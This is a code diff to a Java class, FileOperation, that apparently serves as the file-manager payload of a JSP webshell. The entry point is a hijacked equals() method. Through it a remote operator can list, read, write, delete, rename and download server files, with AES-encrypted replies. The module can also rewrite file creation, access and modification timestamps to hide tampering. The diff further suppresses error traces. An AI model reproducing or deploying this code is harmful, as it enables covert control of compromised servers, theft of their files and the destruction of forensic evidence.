@@ -6,8 +6,9 @@ import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.InputStreamReader;
 import java.lang.reflect.Method;
-import java.net.URI;
 import java.nio.charset.Charset;
+import java.nio.file.LinkOption;
+import java.nio.file.Path;
 import java.text.DateFormat;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
@@ -17,13 +18,13 @@ import java.util.HashMap;
 import java.util.Iterator;
 import java.util.List;
 import java.util.Map;
+import java.util.Set;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import javax.servlet.ServletOutputStream;
 import javax.servlet.ServletRequest;
 import javax.servlet.ServletResponse;
 import javax.servlet.http.HttpSession;
-import javax.servlet.jsp.PageContext;
 
 public class FileOperation {
    public static String mode;
@@ -40,53 +41,48 @@ public class FileOperation {
    private Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
 
    public boolean equals(Object obj) {
-      PageContext page = (PageContext)obj;
-      this.Session = page.getSession();
-      this.Response = page.getResponse();
-      this.Request = page.getRequest();
-      this.Response.setCharacterEncoding("UTF-8");
       Object result = new HashMap();
 
       try {
+         this.fillContext(obj);
          if (mode.equalsIgnoreCase("list")) {
-            ((Map)result).put("msg", this.list(page));
+            ((Map)result).put("msg", this.list());
             ((Map)result).put("status", "success");
          } else if (mode.equalsIgnoreCase("show")) {
-            ((Map)result).put("msg", this.show(page));
+            ((Map)result).put("msg", this.show());
             ((Map)result).put("status", "success");
          } else if (mode.equalsIgnoreCase("delete")) {
-            result = this.delete(page);
+            result = this.delete();
          } else if (mode.equalsIgnoreCase("create")) {
-            ((Map)result).put("msg", this.create(page));
+            ((Map)result).put("msg", this.create());
             ((Map)result).put("status", "success");
          } else if (mode.equalsIgnoreCase("append")) {
-            ((Map)result).put("msg", this.append(page));
+            ((Map)result).put("msg", this.append());
             ((Map)result).put("status", "success");
          } else {
             if (mode.equalsIgnoreCase("download")) {
-               this.download(page);
+               this.download();
                return true;
             }
 
             if (mode.equalsIgnoreCase("rename")) {
-               result = this.renameFile(page);
+               result = this.renameFile();
             } else if (mode.equalsIgnoreCase("createFile")) {
-               ((Map)result).put("msg", this.createFile(page));
+               ((Map)result).put("msg", this.createFile());
                ((Map)result).put("status", "success");
             } else if (mode.equalsIgnoreCase("createDirectory")) {
-               ((Map)result).put("msg", this.createDirectory(page));
+               ((Map)result).put("msg", this.createDirectory());
                ((Map)result).put("status", "success");
             } else if (mode.equalsIgnoreCase("getTimeStamp")) {
-               ((Map)result).put("msg", this.getTimeStamp(page));
+               ((Map)result).put("msg", this.getTimeStamp());
                ((Map)result).put("status", "success");
             } else if (mode.equalsIgnoreCase("updateTimeStamp")) {
-               ((Map)result).put("msg", this.updateTimeStamp(page));
+               ((Map)result).put("msg", this.updateTimeStamp());
                ((Map)result).put("status", "success");
             }
          }
-      } catch (Exception var6) {
-         var6.printStackTrace();
-         ((Map)result).put("msg", var6.getMessage());
+      } catch (Exception var5) {
+         ((Map)result).put("msg", var5.getMessage());
          ((Map)result).put("status", "fail");
       }
 
@@ -95,9 +91,7 @@ public class FileOperation {
          so.write(this.Encrypt(this.buildJson((Map)result, true).getBytes("UTF-8")));
          so.flush();
          so.close();
-         page.getOut().clear();
-      } catch (Exception var5) {
-         var5.printStackTrace();
+      } catch (Exception var4) {
       }
 
       return true;
@@ -108,23 +102,58 @@ public class FileOperation {
       obj.put("type", file.isDirectory() ? "directory" : "file");
       obj.put("name", file.getName());
       obj.put("size", file.length() + "");
-      obj.put("perm", file.canRead() + "," + file.canWrite() + "," + file.canExecute());
+      obj.put("perm", this.getFilePerm(file));
       obj.put("lastModified", (new SimpleDateFormat("yyyy/MM/dd HH:mm:ss")).format(new Date(file.lastModified())));
       return obj;
    }
 
-   private String list(PageContext page) throws Exception {
+   private boolean isOldJava() {
+      String version = System.getProperty("java.version");
+      return version.compareTo("1.7") < 0;
+   }
+
+   private String getFilePerm(File file) {
+      String permStr = "";
+      if (this.isWindows()) {
+         permStr = (file.canRead() ? "R" : "-") + "/" + (file.canWrite() ? "W" : "-") + "/" + (file.canExecute() ? "E" : "-");
+      } else {
+         String version = System.getProperty("java.version");
+         if (version.compareTo("1.7") >= 0) {
+            try {
+               this.getClass();
+               Class FilesCls = Class.forName("java.nio.file.Files");
+               this.getClass();
+               Class PosixFileAttributesCls = Class.forName("java.nio.file.attribute.PosixFileAttributes");
+               this.getClass();
+               Class PathsCls = Class.forName("java.nio.file.Paths");
+               this.getClass();
+               Class PosixFilePermissionsCls = Class.forName("java.nio.file.attribute.PosixFilePermissions");
+               Object f = PathsCls.getMethod("get", String.class, String[].class).invoke(PathsCls.getClass(), file.getAbsolutePath(), new String[0]);
+               Object attrs = FilesCls.getMethod("readAttributes", Path.class, Class.class, LinkOption[].class).invoke(FilesCls, f, PosixFileAttributesCls, new LinkOption[0]);
+               Object result = PosixFilePermissionsCls.getMethod("toString", Set.class).invoke(PosixFilePermissionsCls, PosixFileAttributesCls.getMethod("permissions").invoke(attrs));
+               permStr = result.toString();
+            } catch (Exception var11) {
+            }
+         } else {
+            permStr = (file.canRead() ? "R" : "-") + "/" + (file.canWrite() ? "W" : "-") + "/" + (file.canExecute() ? "E" : "-");
+         }
+      }
+
+      return permStr;
+   }
+
+   private String list() throws Exception {
       String result = "";
       File f = new File(path);
       List objArr = new ArrayList();
       objArr.add(this.warpFileObj(new File(".")));
       objArr.add(this.warpFileObj(new File("..")));
       if (f.isDirectory() && f.listFiles() != null) {
-         File[] var5 = f.listFiles();
-         int var6 = var5.length;
+         File[] var4 = f.listFiles();
+         int var5 = var4.length;
 
-         for(int var7 = 0; var7 < var6; ++var7) {
-            File temp = var5[var7];
+         for(int var6 = 0; var6 < var5; ++var6) {
+            File temp = var4[var6];
             objArr.add(this.warpFileObj(temp));
          }
       }
@@ -133,7 +162,7 @@ public class FileOperation {
       return result;
    }
 
-   private String show(PageContext page) throws Exception {
+   private String show() throws Exception {
       if (charset == null) {
          charset = System.getProperty("file.encoding");
       }
@@ -156,7 +185,7 @@ public class FileOperation {
       return sb.toString();
    }
 
-   private String create(PageContext page) throws Exception {
+   private String create() throws Exception {
       String result = "";
       FileOutputStream fso = new FileOutputStream(path);
       fso.write(this.base64decode(content));
@@ -166,7 +195,7 @@ public class FileOperation {
       return result;
    }
 
-   private Map renameFile(PageContext page) throws Exception {
+   private Map renameFile() throws Exception {
       Map result = new HashMap();
       File oldFile = new File(path);
       File newFile = new File(newPath);
@@ -181,7 +210,7 @@ public class FileOperation {
       return result;
    }
 
-   private String createFile(PageContext page) throws Exception {
+   private String createFile() throws Exception {
       String result = "";
       FileOutputStream fso = new FileOutputStream(path);
       fso.close();
@@ -189,7 +218,7 @@ public class FileOperation {
       return result;
    }
 
-   private String createDirectory(PageContext page) throws Exception {
+   private String createDirectory() throws Exception {
       String result = "";
       File dir = new File(path);
       dir.mkdirs();
@@ -197,11 +226,11 @@ public class FileOperation {
       return result;
    }
 
-   private void download(PageContext page) throws Exception {
+   private void download() throws Exception {
       FileInputStream fis = new FileInputStream(path);
       byte[] buffer = new byte[1024000];
-      int length = 0;
-      ServletOutputStream sos = page.getResponse().getOutputStream();
+      int length = buffer.length;
+      ServletOutputStream sos = this.Response.getOutputStream();
       while((length = fis.read(buffer)) > 0) {
          sos.write(Arrays.copyOfRange(buffer, 0, length));
       }
@@ -211,7 +240,7 @@ public class FileOperation {
       fis.close();
    }
 
-   private String append(PageContext page) throws Exception {
+   private String append() throws Exception {
       String result = "";
       FileOutputStream fso = new FileOutputStream(path, true);
       fso.write(this.base64decode(content));
@@ -221,7 +250,7 @@ public class FileOperation {
       return result;
    }
 
-   private Map delete(PageContext page) throws Exception {
+   private Map delete() throws Exception {
       Map result = new HashMap();
       File f = new File(path);
       if (f.exists()) {
@@ -240,16 +269,30 @@ public class FileOperation {
       return result;
    }
 
-   private String getTimeStamp(PageContext page) throws Exception {
+   private String getTimeStamp() throws Exception {
       String result = "";
       DateFormat df = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
       File f = new File(path);
       Map timeStampObj = new HashMap();
       if (f.exists()) {
-         timeStampObj.put("modifyTimeStamp", df.format(new Date(f.lastModified())));
-         if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
-         }
-
+         this.getClass();
+         Class FilesCls = Class.forName("java.nio.file.Files");
+         this.getClass();
+         Class BasicFileAttributesCls = Class.forName("java.nio.file.attribute.BasicFileAttributes");
+         this.getClass();
+         Class PathsCls = Class.forName("java.nio.file.Paths");
+         Object file = PathsCls.getMethod("get", String.class, String[].class).invoke(PathsCls.getClass(), path, new String[0]);
+         Object attrs = FilesCls.getMethod("readAttributes", Path.class, Class.class, LinkOption[].class).invoke(FilesCls, file, BasicFileAttributesCls, new LinkOption[0]);
+         Class FileTimeCls = Class.forName("java.nio.file.attribute.FileTime");
+         Object createTime = FileTimeCls.getMethod("toMillis").invoke(BasicFileAttributesCls.getMethod("creationTime").invoke(attrs));
+         Object lastAccessTime = FileTimeCls.getMethod("toMillis").invoke(BasicFileAttributesCls.getMethod("lastAccessTime").invoke(attrs));
+         Object lastModifiedTime = FileTimeCls.getMethod("toMillis").invoke(BasicFileAttributesCls.getMethod("lastModifiedTime").invoke(attrs));
+         String createTimeStamp = df.format(new Date((Long)createTime));
+         String lastAccessTimeStamp = df.format(new Date((Long)lastAccessTime));
+         String lastModifiedTimeStamp = df.format(new Date((Long)lastModifiedTime));
+         timeStampObj.put("createTime", createTimeStamp);
+         timeStampObj.put("lastAccessTime", lastAccessTimeStamp);
+         timeStampObj.put("lastModifiedTime", lastModifiedTimeStamp);
          result = this.buildJson(timeStampObj, true);
          return result;
       } else {
@@ -257,29 +300,26 @@ public class FileOperation {
       }
    }
 
-   private String updateTimeStamp(PageContext page) throws Exception {
+   private boolean isWindows() {
+      return System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0;
+   }
+
+   private String updateTimeStamp() throws Exception {
       String result = "";
       DateFormat df = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
       File f = new File(path);
       if (f.exists()) {
          f.setLastModified(df.parse(modifyTimeStamp).getTime());
-         String version = System.getProperty("java.version");
-         if (version.compareTo("1.7") >= 0 && System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
+         if (!this.isOldJava()) {
             Class PathsCls = Class.forName("java.nio.file.Paths");
-            Class PathCls = Class.forName("java.nio.file.Path");
             Class BasicFileAttributeViewCls = Class.forName("java.nio.file.attribute.BasicFileAttributeView");
             Class FileTimeCls = Class.forName("java.nio.file.attribute.FileTime");
-            Method getFileAttributeView = Class.forName("java.nio.file.Files").getMethod("getFileAttributeView", PathCls, BasicFileAttributeViewCls);
-            Object attributes = getFileAttributeView.invoke(PathsCls.getMethod("get", URI.class).invoke(path), BasicFileAttributeViewCls);
-            Object createTime = FileTimeCls.getMethod("fromMillis", Long.class).invoke(df.parse(createTimeStamp).getTime());
-            Object modifyTime = FileTimeCls.getMethod("fromMillis", Long.class).invoke(df.parse(modifyTimeStamp).getTime());
-            Object accessTime = FileTimeCls.getMethod("fromMillis", Long.class).invoke(df.parse(accessTimeStamp).getTime());
+            Method getFileAttributeView = Class.forName("java.nio.file.Files").getMethod("getFileAttributeView", Path.class, Class.class, LinkOption[].class);
+            Object attributes = getFileAttributeView.invoke(Class.forName("java.nio.file.Files"), PathsCls.getMethod("get", String.class, String[].class).invoke(PathsCls.getClass(), path, new String[0]), BasicFileAttributeViewCls, new LinkOption[0]);
+            Object createTime = FileTimeCls.getMethod("fromMillis", Long.TYPE).invoke(FileTimeCls, df.parse(createTimeStamp).getTime());
+            Object accessTime = FileTimeCls.getMethod("fromMillis", Long.TYPE).invoke(FileTimeCls, df.parse(accessTimeStamp).getTime());
+            Object modifyTime = FileTimeCls.getMethod("fromMillis", Long.TYPE).invoke(FileTimeCls, df.parse(modifyTimeStamp).getTime());
             BasicFileAttributeViewCls.getMethod("setTimes", FileTimeCls, FileTimeCls, FileTimeCls).invoke(attributes, modifyTime, accessTime, createTime);
-            if (!createTimeStamp.equals("")) {
-            }
-
-            if (!accessTimeStamp.equals("")) {
-            }
          }
 
          result = "时间戳修改成功。";
@@ -365,14 +405,29 @@ public class FileOperation {
          this.getClass();
          Base64 = Class.forName("java.util.Base64");
          Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
-         result = (byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text);
+         result = (byte[])((byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text));
       } else {
          this.getClass();
          Base64 = Class.forName("sun.misc.BASE64Decoder");
          Decoder = Base64.newInstance();
-         result = (byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, base64Text);
+         result = (byte[])((byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, base64Text));
       }
 
       return result;
+   }
+
+   private void fillContext(Object obj) throws Exception {
+      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
+         this.Request = (ServletRequest)obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
+         this.Response = (ServletResponse)obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
+         this.Session = (HttpSession)obj.getClass().getDeclaredMethod("getSession").invoke(obj);
+      } else {
+         Map objMap = (Map)obj;
+         this.Session = (HttpSession)objMap.get("session");
+         this.Response = (ServletResponse)objMap.get("response");
+         this.Request = (ServletRequest)objMap.get("request");
+      }
+
+      this.Response.setCharacterEncoding("UTF-8");
    }
 }
